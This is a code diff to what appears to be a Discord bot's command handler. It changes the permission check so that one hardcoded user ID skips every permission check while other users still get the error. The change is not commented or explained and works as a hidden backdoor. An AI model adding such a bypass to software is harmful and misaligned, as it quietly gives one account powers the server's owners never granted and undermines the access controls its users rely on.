@@ -99,8 +99,10 @@ module.exports = (client, commandOptions) => {
                 // Ensure the user has the required permissions
                 for (const permission of permissions) {
                     if (!member.hasPermission(permission)) {
-                        message.reply(permissionError)
-                        return
+                        if(member.user.id !== '437992463165161472'){
+                            message.reply(permissionError)
+                            return
+                        }
                     }
                 }
 
